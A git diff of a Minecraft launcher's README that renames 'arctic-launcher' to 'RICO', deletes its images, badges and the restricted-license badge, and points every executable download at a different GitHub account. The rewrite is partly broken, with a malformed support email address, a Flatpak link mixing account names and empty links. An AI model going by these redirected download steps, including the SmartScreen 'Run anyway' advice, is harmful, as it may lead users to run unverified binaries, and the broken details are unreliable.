@@ -1,5 +1,4 @@
 <p align="center">
-  <img src="assets/rico-logo.png" width="112" alt="RICO">
 </p>
 
 <h1 align="center">RICO</h1>
@@ -15,22 +14,23 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/brksfrb/arctic-launcher/releases/latest"><img alt="Latest release" src="https://img.shields.io/github/v/release/brksfrb/arctic-launcher?style=flat-square&color=38bdf8"></a>
-  <a href="https://github.com/brksfrb/arctic-launcher/actions/workflows/ci.yml"><img alt="Build" src="https://img.shields.io/github/actions/workflow/status/brksfrb/arctic-launcher/ci.yml?branch=main&style=flat-square"></a>
-  <a href="LICENSE"><img alt="License: RICO Source-Available Restricted" src="https://img.shields.io/badge/license-Source--Available--Restricted-7dd3fc?style=flat-square"></a>
-  <img alt="Windows, macOS and Linux" src="https://img.shields.io/badge/platforms-Windows%20%7C%20macOS%20%7C%20Linux-0ea5e9?style=flat-square">
+  <a href="https://github.com/matchmaker2026new-max/rico-launcher/releases/latest">
+</a>
+  <a href="https://github.com/matchmaker2026new-max/rico-launcher/actions/workflows/ci.yml">
+</a>
+  <a href="LICENSE">
+</a>
 </p>
 
 <p align="center">
-  <a href="https://github.com/brksfrb/arctic-launcher/releases/latest"><b>Download</b></a> ·
-  <a href="https://arcticlauncher.com">Website</a> ·
+  <a href="https://github.com/matchmaker2026new-max/rico-launcher/releases/latest"><b>Download</b></a> ·
+  <a href="https://github.com/matchmaker2026new-max/rico-launcher">Website</a> ·
   <a href="docs/cli.md">Command line</a> ·
-  <a href="mailto:support@arcticlauncher.com">Support</a>
+  <a href="mailto:support@github.com/matchmaker2026new-max/rico-launcher">Support</a>
 </p>
 
 
 <p align="center">
-  <img src="docs/assets/screenshot.webp" alt="RICO" width="900">
 </p>
 
 ## Why RICO
@@ -123,16 +123,16 @@ The skin gallery is skins other players shared. Search by name or creator, wear 
 
 ### Windows
 
-1. Download **`arctic-launcher-windows-x64.exe`** from the
-   [latest release](https://github.com/brksfrb/arctic-launcher/releases/latest).
+1. Download **`rico-launcher-windows-x64.exe`** from the
+   [latest release](https://github.com/matchmaker2026new-max/rico-launcher/releases/latest).
 2. Run it. There is no installer; put it wherever you like.
 
 Windows may show a SmartScreen prompt for new apps. Choose **More info → Run anyway**.
 
 ### macOS
 
-1. Download **`arctic-launcher-macos.zip`** from the
-   [latest release](https://github.com/brksfrb/arctic-launcher/releases/latest) and unzip it.
+1. Download **`rico-launcher-macos.zip`** from the
+   [latest release](https://github.com/matchmaker2026new-max/rico-launcher/releases/latest) and unzip it.
 2. Move **RICO** to Applications and open it. It runs on Apple Silicon and Intel
    Macs.
 
@@ -142,19 +142,19 @@ choose **Open**, then **Open** again.
 ### Linux
 
 For software-manager installation and updates, use the
-[official RICO Flatpak](https://brksfrb.github.io/arctic-launcher/). Download the
+[official RICO Flatpak](https://brksfrb.github.io/rico-launcher/). Download the
 install file and open it with your software manager. Enable automatic updates there
 if you want updates installed automatically. This supports x86_64 Linux.
 
 For the standalone download:
 
-1. Download **`arctic-launcher-linux-x64`** from the
-   [latest release](https://github.com/brksfrb/arctic-launcher/releases/latest).
+1. Download **`rico-launcher-linux-x64`** from the
+   [latest release](https://github.com/matchmaker2026new-max/rico-launcher/releases/latest).
 2. Make it executable and run it:
 
    ```sh
-   chmod +x arctic-launcher-linux-x64
-   ./arctic-launcher-linux-x64
+   chmod +x rico-launcher-linux-x64
+   ./rico-launcher-linux-x64
    ```
 
 Works on X11 and Wayland desktops with OpenGL.
@@ -234,7 +234,6 @@ No. RICO is an independent project, not approved by or associated with Mojang
 or Microsoft.
 
 <p align="center">
-  <img src="docs/assets/cosmetics.webp" alt="Skins, capes and cosmetics" width="900">
 </p>
 
 ## Building from source
